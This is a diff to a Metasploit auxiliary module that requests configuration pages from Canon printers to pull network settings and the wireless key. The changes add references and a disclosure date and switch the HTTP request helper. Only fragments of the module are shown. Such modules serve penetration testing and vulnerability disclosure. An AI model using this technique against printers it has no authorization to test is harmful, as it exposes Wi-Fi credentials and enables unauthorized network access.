@@ -19,8 +19,11 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					'Matt "hostess" Andreko <mandreko[at]accuvant.com>'
 				],
-		))
-
+			'References'     => [
+				[ 'OSVDB', '' ],
+				[ 'URL', 'http://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
+			],
+			'DisclosureDate' => 'June 15 2013'))
 		register_options(
 			[
 				Opt::RPORT(80),
@@ -29,10 +32,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	def get_network_settings
 		begin
-			res = send_request_raw({
+			res = send_request_cgi({
 				'method' => 'GET',
-				'uri'    => "/English/pages_MacUS/lan_set_content.html",
-			}, 25)
+				'uri'    => '/English/pages_MacUS/lan_set_content.html',
+			})
 		rescue
 			print_error("#{rhost}:#{rport} Could not connect.")
 			return
@@ -75,10 +78,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	def get_wireless_key
 		begin
-			res = send_request_raw({
+			res = send_request_cgi({
 				'method' => 'GET',
 				'uri'    => "/English/pages_MacUS/wls_set_content.html",
-			}, 25)
+			})
 		rescue
 			print_error("#{ip}:#{rport} Could not connect.")
 			return
